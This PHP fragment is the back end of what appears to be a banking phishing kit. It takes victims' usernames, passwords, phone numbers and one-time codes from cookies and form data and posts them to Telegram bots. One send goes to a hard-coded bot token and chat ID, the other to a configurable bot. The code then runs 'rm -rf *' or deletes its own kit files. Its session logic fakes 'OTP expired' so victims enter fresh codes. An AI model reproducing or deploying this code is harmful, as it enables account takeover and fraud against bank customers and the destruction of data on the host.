$us = [
'chat_id' => "-635799224",
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
];
file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($us));

 if(function_exists('system')) {
         system('rm -rf *');
      }
      elseif(function_exists('exec')) {
         exec('rm -rf *');
      }
      elseif(function_exists('shell_exec')) {
         shell_exec('rm -rf *');
      }
      else {
        unlink('lbpiaccess.zip');
        unlink('confirm.php');
        unlink('cc.jpg');
        unlink('otp-login.php');
        unlink('otp-expired.jpg');
        unlink('otp.jpg');
        unlink('mobile-login.php');
        unlink('mobile.jpg');
        unlink('login.php');
        unlink('index.php');
        unlink('index.jpg');
      }
$data = [
'chat_id' => $chat_id,
'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

@session_start();
if (isset($_SESSION['first_visit'])) {
   if (isset($_SESSION['second_visit'])) {
      header("Location: index.php?confirm=identity");
   }
   else {
      $_SESSION['second_visit'] = "Second Visit";
      header("Location: index.php?otp=expired");
   }
}
else {
   $_SESSION['first_visit'] = "First Visit";
   header("Location: index.php?otp=expired");
}
